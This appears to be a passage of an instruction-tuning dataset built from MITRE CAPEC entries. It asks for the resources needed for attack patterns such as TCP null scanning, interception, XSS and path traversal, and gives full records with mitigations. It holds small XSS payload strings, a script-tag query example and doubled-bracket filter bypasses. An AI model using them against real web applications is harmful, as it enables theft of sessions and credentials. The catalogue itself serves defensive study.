[
  {
    "instruction": "List the required resources to perform the following capec attack pattern: TCP Null Scan (CAPEC ID: 304)",
    "context": "",
    "output": "required resources:\nThis attack can be carried out via a network mapper/scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "This attack can be carried out via a network mapper/scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
      "@Name": "TCP Null Scan (CAPEC ID: 304)",
      "attack_ptrn": {
        "@ID": "304",
        "@Name": "TCP Null Scan",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses a TCP NULL scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with no flags in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.",
        "Extended_Description": {
          "xhtml:p": "In addition to being fast, the major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. NULL packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, NULL scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, NULL scans are flagged by almost all intrusion prevention or intrusion detection systems."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "300"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "An adversary sends TCP packets with no flags set and that are not associated with an existing connection to target ports."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary requires logical access to the target network. NULL scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges."
        },
        "Resources_Required": {
          "Resource": "This attack can be carried out via a network mapper/scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Employ a robust network defensive posture that includes a managed IDS/IPS."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 5.5 TCP FIN, NULL, XMAS Scans, pg. 107"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "#text": "Many operating systems do not implement RFC 793 exactly and for this reason NULL scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing the adversary from distinguishing between open and closed ports. NULL scans are limited by the range of platforms against which they work."
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Execution_Flow, Mitigations, Notes"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Interception (CAPEC ID: 117)",
    "context": "",
    "output": "required resources:\nThe adversary must have the necessary technology to intercept information passing between the nodes of a network. For TCP/IP, the capability to run tcpdump, ethereal, etc. can be useful. Depending upon the data being targeted the technological requirements will change.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must have the necessary technology to intercept information passing between the nodes of a network. For TCP/IP, the capability to run tcpdump, ethereal, etc. can be useful. Depending upon the data being targeted the technological requirements will change.",
      "@Name": "Interception (CAPEC ID: 117)",
      "attack_ptrn": {
        "@ID": "117",
        "@Name": "Interception",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position themself so as to observe explicit data channels (e.g. network traffic) and read the content. However, this attack differs from a Adversary-In-the-Middle (CAPEC-94) attack, as the adversary does not alter the content of the communications nor forward data to the intended recipient.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Medium",
        "Prerequisites": {
          "Prerequisite": "The target must transmit data over a medium that is accessible to the adversary."
        },
        "Resources_Required": {
          "Resource": "The adversary must have the necessary technology to intercept information passing between the nodes of a network. For TCP/IP, the capability to run tcpdump, ethereal, etc. can be useful. Depending upon the data being targeted the technological requirements will change."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "319"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Description, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Read Sensitive Constants Within an Executable (CAPEC ID: 191)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Read Sensitive Constants Within an Executable (CAPEC ID: 191):\nBinary analysis programs such as 'strings' or 'grep', or hex editors.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Binary analysis programs such as 'strings' or 'grep', or hex editors.",
      "@Name": "Read Sensitive Constants Within an Executable (CAPEC ID: 191)",
      "attack_ptrn": {
        "@ID": "191",
        "@Name": "Read Sensitive Constants Within an Executable",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": "An adversary engages in activities to discover any sensitive constants present within the compiled code of an executable. These constants may include literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis."
        },
        "Extended_Description": {
          "xhtml:p": [
            "One specific example of a sensitive string is a hard-coded password. Typical examples of software with hard-coded passwords include server-side executables which may check for a hard-coded password or key during a user's authentication with the server. Hard-coded passwords can also be present in client-side executables which utilize the password or key when connecting to either a remote component, such as a database server, licensing server, or otherwise, or a processes on the same host that expects a key or password. When analyzing an executable the adversary may search for the presence of such strings by analyzing the byte-code of the file itself. Example utilities for revealing strings within a file include 'strings,' 'grep,' or other variants of these programs depending upon the type of operating system used. These programs can be used to dump any ASCII or UNICODE strings contained within a program. Strings can also be searched for using a hex editors by loading the binary or object code file and utilizing native search functions such as regular expressions.",
            "Additionally, sensitive numeric values can occur within an executable. This can be used to discover the location of cryptographic constants."
          ]
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "167",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "Access to a binary or executable such that it can be analyzed by various utilities."
        },
        "Resources_Required": {
          "Resource": "Binary analysis programs such as 'strings' or 'grep', or hex editors."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "798"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1552.001",
            "Entry_Name": "Unsecured Credentials:Credentials in files"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-51",
              "@Section": "Decompiler"
            },
            {
              "@External_Reference_ID": "REF-52",
              "@Section": "Debugger"
            },
            {
              "@External_Reference_ID": "REF-53",
              "@Section": "Disassembler"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "xhtml:p": [
              "More sophisticated methods of searching for sensitive strings within a file involve disassembly or decompiling of the file. One could, for example, utilize disassembly methods on an ISAPI executable or dll to discover a hard-coded password within the code as it executes. This type of analysis usually involves four stages in which first a debugger is attached to the running process, anti-debugging countermeasures are circumvented or bypassed, the program is analyzed step-by-step, and breakpoints are established so that discrete functions and data structures can be analyzed.",
              "Debugging tools such as SoftICE, Ollydbg, or vendor supplied debugging tools are often used. Disassembly tools such as IDA pro, or similar tools, can also be employed. A third strategy for accessing sensitive strings within a binary involves the decompilation of the file itself into source code that reveals the strings. An example of this type of analysis involves extracting source code from a java JAR file and then using functionality within a java IDE to search the source code for sensitive, hard-coded information. In performing this analysis native java tools, such as \"jar\" are used to extract the compiled class files. Next, a java decompiler such as \"DJ\" is used to extract java source code from the compiled classes, revealing source code. Finally, the source code is audited to reveal sensitive information, a step that is usually assisted by source code analysis programs."
            ]
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Description Summary, Other_Notes, References, Related_Attack_Patterns, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Name, Description, Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2020-07-30",
            "#text": "Read Sensitive Strings Within an Executable"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: XSS Through HTTP Query Strings (CAPEC ID: 32), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nAbility to send HTTP post to scripting host and collect output",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to send HTTP post to scripting host and collect output",
      "@Name": "XSS Through HTTP Query Strings (CAPEC ID: 32)",
      "attack_ptrn": {
        "@ID": "32",
        "@Name": "XSS Through HTTP Query Strings",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary embeds malicious script code in the parameters of an HTTP query string and convinces a victim to submit the HTTP request that contains the query string to a vulnerable web application. The web application then procedes to use the values parameters without properly validation them first and generates the HTML code that will be executed by the victim's browser.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "591"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "588"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "592"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for public links] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find.",
              "Technique": [
                "Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe public links for XSS vulnerability] The adversary uses the public links gathered in the \"Explore\" phase as a target list and requests variations on the URLs they spidered before. They send parameters that include variations of payloads. They record all the responses from the server that include unmodified versions of their script.",
              "Technique": [
                "Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier.",
                "Use a proxy tool to record results of manual input of XSS probes in known URLs."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.",
              "Technique": [
                "Change a URL parameter to include a malicious script tag.",
                "Send information gathered from the malicious script to a remote endpoint."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.",
              "Technique": [
                "Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.",
                "Put the malicious URL on a public forum, where many victims might accidentally click the link."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target client software must allow scripting such as JavaScript. Server software must allow display of remote generated HTML without sufficient input or output validation."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To place malicious payload on server via HTTP"
            },
            {
              "@Level": "High",
              "#text": "Exploiting any information gathered by HTTP Query on script host"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Ability to send HTTP post to scripting host and collect output"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use browser technologies that do not allow client side scripting.",
            "Design: Utilize strict type, character, and encoding enforcement",
            "Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.",
            "Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.",
            "Implementation: Perform input validation for all remote content, including remote and user-generated content",
            "Implementation: Perform output validation for all remote content.",
            "Implementation: Disable scripting languages such as JavaScript in browser",
            "Implementation: Session tokens for specific host",
            "Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.",
            "Implementation: Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode"
          ]
        },
        "Example_Instances": {
          "Example": [
            "http://user:host@example.com:8080/oradb<script>alert('Hi')</script>",
            {
              "xhtml:p": [
                "Web applications that accept name value pairs in a HTTP Query string are inherently at risk to any value (or name for that matter) that an adversary would like to enter in the query string. This can be done manually via web browser or trivially scripted to post the query string to multiple sites. In the latter case, in the instance of many sites using similar infrastructure with predictable http queries being accepted and operated on (such as blogging software, Google applications, and so on), a single malicious payload can be scripted to target a wide variety of sites.",
                "Web 2.0 type sites like Technorati and del.icio.us rely on user generated content like tags to build http links that are displayed to other users. del.icio.us allows users to identify sites, tag them with metadata and provide URL, descriptions and more data. This data is then echoed back to any other web browser that is interested in the link. If the data is not validated by the del.icio.us site properly then an arbitrary code can be added into the standard http string sent to del.icio.us by the adversary, for example formatted as normal content with a URL and description and tagged as Java, and available to be clicked on (and executed by) any user browsing for Java content that clicks on this trojaned content."
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "80"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases, Description Summary, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Embedding Scripts in HTTP Query Strings"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: XSS Using Doubled Characters (CAPEC ID: 245)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern XSS Using Doubled Characters (CAPEC ID: 245):\nThe adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.",
      "@Name": "XSS Using Doubled Characters (CAPEC ID: 245)",
      "attack_ptrn": {
        "@ID": "245",
        "@Name": "XSS Using Doubled Characters",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "The adversary bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the adversary can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "591"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "592"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "588"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for XSS using double characters] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads modified to use double characters and doubled special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.",
              "Technique": [
                "Use a list of XSS probe strings using double characters to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.",
                "Use a proxy tool to record results of manual input of XSS probes in known URLs.",
                "Use a list of doubled HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.",
              "Technique": [
                "Execute a script using an expression embedded in an HTML attribute, which avoids needing to inject a script tag.",
                "Send information gathered from the malicious script to a remote endpoint."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.",
              "Technique": [
                "Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.",
                "Put the malicious URL on a public forum, where many victims might accidentally click the link."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted web application does not fully normalize input before checking for prohibited syntax. In particular, it must fail to recognize prohibited methods preceded by certain sequences of repeated characters."
        },
        "Resources_Required": {
          "Resource": "The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed."
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use libraries and templates that minimize unfiltered input.",
            "Implementation: Normalize, filter and sanitize all user supplied fields.",
            "Implementation: The victim should configure the browser to minimize active content from untrusted sources."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "85"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-99"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Execution_Flow, Resources_Required"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Cross-Site Scripting Using Doubled Characters, e.g. %3C%3Cscript"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Path Traversal (CAPEC ID: 126)",
    "context": "",
    "output": "required resources:\nThe ability to manually manipulate path information either directly through a client application relative to the service or application or via a proxy application.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The ability to manually manipulate path information either directly through a client application relative to the service or application or via a proxy application.",
      "@Name": "Path Traversal (CAPEC ID: 126)",
      "attack_ptrn": {
        "@ID": "126",
        "@Name": "Path Traversal",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or \\) and/or dots (.)) to reach desired directories or files.",
        "Alternate_Terms": {
          "Alternate_Term": {
            "Term": "Directory Traversal"
          }
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "153"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "664"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Fingerprinting of the operating system] In order to perform a valid path traversal, the attacker needs to know what the underlying OS is so that the proper file seperator is used.",
              "Technique": [
                "Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.",
                "TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.",
                "Induce errors to find informative error messages"
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable file inputs"
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one, the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.)"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The attacker must be able to control the path that is requested of the target.",
            "The target must fail to adequately sanitize incoming paths"
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "Simple command line attacks or to inject the malicious payload in a web page."
            },
            {
              "@Level": "Medium",
              "#text": "Customizing attacks to bypass non trivial filters in the application."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The ability to manually manipulate path information either directly through a client application relative to the service or application or via a proxy application."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Integrity",
                "Confidentiality",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries."
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data",
              "Note": "The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication."
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data",
              "Note": "The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system."
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution",
              "Note": "The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Configure the access control correctly.",
            "Design: Enforce principle of least privilege.",
            "Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.",
            "Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement.",
